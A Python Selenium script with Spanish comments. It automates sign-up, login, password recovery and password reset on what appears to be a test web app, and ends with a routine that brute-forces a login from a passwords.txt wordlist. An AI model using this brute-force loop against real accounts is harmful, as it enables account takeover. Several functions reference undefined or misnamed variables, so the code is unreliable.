import selenium
import time
from selenium import webdriver
from selenium.webdriver.common.keys import Keys

# Abre el navegador


def spawn_browser():
    chrome_options = webdriver.ChromeOptions()
    chrome_options.add_argument("--start-maximized")
    chrome_options.add_argument("-auto-open-devtools-for-tabs")
    chrome_options.add_experimental_option("detach", True)
    driver = webdriver.Chrome(options=chrome_options)
    driver.get("http://test.teroapp.com/")
    driver.set_window_position(1, 1)
    driver.set_window_size(2000, 800)
    driver.implicitly_wait(10)
    return driver

# Busca el botón de registro de usuarios


def register_button():
    register_button = driver.find_element_by_id('registerButton')
    register_button.click()

# Busca el botón de inicio de sesión


def login_button():
    login_button = driver.find_element_by_id('loginButton')
    login_button.click()

# Abre el formulario de recuperación de contraseña


def enter_recover_password():
    recovery_link = driver.find_element_by_partial_link_text(
        '¿Olvidaste tu contraseña?')
    recovery_link.click()

# Abre el formulario de login


def enter_login():
    login_link = driver.find_element_by_partial_link_text(
        'Iniciar sesión')
    login_link.click()

# Abre el formulario de mofificación de usuario


def enter_update_profile():
    time.sleep(5)
    driver.get('http://test.teroapp.com//app/profile')
    update_user_button = driver.find_element_by_id('updateUserButton')
    update_user_button.click()

# Desbloque la opción para ingresar contraseña


def unlock_password_form():
    driver.find_element_by_css_selector(
        "input[type='checkbox']").click()


# Rellena el formulario de registro de usuario


def fill_register_form(user):
    mail = driver.find_element_by_name('mail')
    password = driver.find_element_by_name('password')
    confirmPassword = driver.find_element_by_name('confirmPassword')
    name = driver.find_element_by_name('name')

    mail.send_keys(user['mail'], Keys.ARROW_DOWN)
    password.send_keys(user['password'], Keys.ARROW_DOWN)
    confirmPassword.send_keys(user['confirmPassword'], Keys.ARROW_DOWN)
    name.send_keys(user['name'], Keys.ARROW_DOWN)
    lastName.send_keys(user['lastName'], Keys.ARROW_DOWN)


# Rellena el formulario de inicio de sesión

def fill_login_form(login_data):
    mail = driver.find_element_by_name('mail')
    password = driver.find_element_by_name('password')
    mail.send_keys(login_data['mail'], Keys.ARROW_DOWN)
    password.send_keys(login_data['password'], Keys.ARROW_DOWN)


# Rellena el formulario de email para recuperar contraseña

def fill_recover_password_email(email):
    mail = driver.find_element_by_name('mail')
    mail.send_keys(email, Keys.ARROW_DOWN)

# Rellena el formulario para actualizar la contraseña


def fill_update_password(reset_data):
    password = driver.find_element_by_name('password')
    confirmPassword = driver.find_element_by_name('confirmPassword')

    password.send_keys(user['password'], Keys.ARROW_DOWN)
    confirmPassword.send_keys(user['confirmPassword'], Keys.ARROW_DOWN)

# Registra el usuario


def register_user(user):
    register_button()
    fill_register_form(user)
    driver.find_element_by_id('submitRegister').click()

# Inicio de sesión


def login(login_data):
    login_button()
    fill_login_form(login_data)
    driver.find_element_by_id('submitLogin').click()


# Resetea contraseña sin login


def recover_password(resetData):
    login_button()
    enter_recover_password()
    fill_recover_password_email(reset_data['mail'])
    driver.find_element_by_css_selector(
        "button[type='submit']").click()

# Reinicia la contraseña para un usuario autenticado


def reset_password(login_data, reset_data):
    login(login_data)
    driver.implicitly_wait(20)
    enter_update_profile()
    unlock_password_form()
    fill_update_password(reset_data)
    time.sleep(2)
    driver.find_element_by_id('updateUserSubmit').click()


# Login por fuerza bruta

def login_by_brute_force(mail):
    passwords = open('passwords.txt', 'r')
    login_button()
    tries = 0
    for password in passwords:
        tries += 1
        print('Intento', tries)
        print(password)
        login_data = {'mail': mail, 'password': password}
        fill_login_form(login_data)
        time.sleep(1)
        driver.find_element_by_id('submitLogin').click()
        if driver.find_element_by_id('loginError'):
            enter_recover_password()
            enter_login()
        else:
            break
    return


driver = spawn_browser()

user = {'mail': 'john.bidwell@mail.udp.cl', 'password': '1',
        'confirmPassword': '1', 'name': 'John', 'lastName': 'Bidwell'}
register_user(user)

login_data = {'mail': 'john.bidwell@mail.udp.cl', 'password': '1'}
login(login_data)

recovery_data = {'mail': 'john.bidwell@mail.udp.cl', 'newPassword': '12'}
recover_password(recovery_data)

reset_data = {'password': '123456', 'confirmPassword': '123456'}
reset_password(login_data, reset_data)

brute_force_mail = 'john.bidwell@mail.udp.cl'
login_by_brute_force(brute_force_mail)
